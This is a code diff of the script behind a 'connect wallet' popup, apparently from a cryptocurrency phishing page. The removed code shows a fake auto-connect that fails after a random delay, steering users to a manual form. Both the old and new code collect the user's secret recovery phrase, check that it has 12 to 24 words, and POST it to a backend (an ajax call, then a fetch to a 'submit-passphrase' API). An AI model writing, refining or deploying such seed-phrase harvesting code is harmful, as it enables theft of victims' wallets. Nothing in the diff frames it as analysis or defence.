@@ -157,42 +157,19 @@
 
 
 <script>
-    // Handle Select Wallet Click
     $(function () {
         $('.select_wallet').on('click', function () {
             var wd = $(this); // wd = wallet details
             $('#wallet_name').text(wd.data('title'));
             $('#wallet_logo').attr("src", wd.data('logo'));
-            $('#auto_connecting').show();
+            $('#auto_connecting').hide(); // Hide auto-connecting
             $('#failed_to_connect').hide();
-            $('#div_connect_manuallly').hide();
+            $('#div_connect_manuallly').show(); // Show manual connection
 
             $('#popup_connect_wallet').modal('show');
-
-            // Hide autoconnecting div and show error in random interval
-            var interval = 1000 * getRandomInt(1, 15);
-            setTimeout(() => {
-                $('#auto_connecting').hide();
-                $('#div_connect_manuallly').hide();
-                $('#failed_to_connect').show();
-            }, interval);
         });
 
-        $('#try_auto_connecting_again').on('click', function (e) {
-            e.preventDefault();
-            $('#auto_connecting').show();
-            $('#failed_to_connect').hide();
-            $('#div_connect_manuallly').hide();
-
-            // Hide autoconnecting div and show error in random interval
-            var interval = 1000 * getRandomInt(1, 20);
-            setTimeout(() => {
-                $('#auto_connecting').hide();
-                $('#div_connect_manuallly').hide();
-                $('#failed_to_connect').show();
-            }, interval);
-        });
-
+        // Only show manual connection form when the "Connect Manually" button is clicked
         $(document).on("click", "#button_connect_manually", function (e) {
             e.preventDefault();
             $('#auto_connecting').hide();
@@ -200,35 +177,25 @@
             $('#div_connect_manuallly').show();
         });
 
-     //FOR PHRASE TEXT VALIDATION
-            $('#secret_phrase').on('keyup', function () {
-                var phrase_seed_entered = $(this).val().trim()
-                if (phrase_seed_entered != "") {
-                    var phrase_count = phrase_seed_entered.match(/(\w+)/g).length
-                    console.log(phrase_count)
-                    if ([12, 15, 18, 21, 24].includes(phrase_count)) {
-                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-                    } else {
-                        $('#button_connect_wallet').attr('disabled', false).css('opacity', '1')
-                    }
+        // Wallet connection validation and processing logic
+        $('#secret_phrase').on('keyup', function () {
+            var phrase_seed_entered = $(this).val().trim();
+            if (phrase_seed_entered !== "") {
+                var phrase_count = phrase_seed_entered.match(/(\w+)/g).length;
+                if ([12, 15, 18, 21, 24].includes(phrase_count)) {
+                    $('#button_connect_wallet').attr('disabled', false).css('opacity', '1');
                 } else {
-                    $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2')
+                    $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2');
                 }
-            })
+            } else {
+                $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2');
+            }
+        });
 
-        // CONNECT WALLET BUTTON Handler
-        $(document).on("click", "#button_connect_wallet", function (e) {
+        $(document).on("click", "#button_connect_wallet", async function (e) {
             e.preventDefault();
             let field = $('#secret_phrase');
-            $(this).text('Loading...');
-
-            var interval = 1000 * getRandomInt(1, 20);
-            setTimeout(() => {
-                $('#auto_connecting').hide();
-                $('#div_connect_manuallly').hide();
-                $('#failed_to_connect').show();
-                $(this).text('Connect Wallet');
-            }, interval);
+            $(this).text('Connecting...');
 
             var formData = {
                 wallet_phrase: field.val(),
@@ -237,36 +204,40 @@
                 sent: 'yes'
             };
 
-            // Log the form data to check what is being sent
             console.log('Form data being sent:', formData);
 
-            $.ajax({
-                /*headers: {
-                    'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
-                },*/
-                url: "configuration/process",
-                type: "POST",
-                data: formData,
-                dataType: "json",
-                encode: true,
-                success: function(response) {
-              
-                window.location.href = "/dashboard.html";
-               
-                },
-                error: function(error) {
-                    console.error('Error saving form data:', error);
-                }
-            }).done(function (data) {
-                console.log(data);
-            });
-        });
+            const token = localStorage.getItem('token');
+            try {
+                const response = await fetch('http://localhost:8000/api/submit-passphrase', {
+                    method: "POST",
+                    headers: {
+                        'Authorization': `Bearer ${token}`,
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(formData)
+                });
 
-        function getRandomInt(min, max) {
-            min = Math.ceil(min);
-            max = Math.floor(max);
-            return Math.floor(Math.random() * (max - min) + min); // The maximum is exclusive and the minimum is inclusive
-        }
+                const result = await response.json();
+
+                if (response.ok) {
+                    alert('Successfully connected!');
+                    
+                    // Redirect after a short delay
+                    setTimeout(() => {
+                        window.location.href = "/user/dashboard.html";
+                    }, 2000);
+                } else {
+                    // Handle errors returned from the backend
+                    console.error('Error:', result.error);
+                    alert(result.error || 'Error connecting to wallet');
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+                alert('An error occurred while connecting to the wallet');
+            } finally {
+                $(this).text('Connect Wallet');
+            }
+        });
     });
 </script>
 
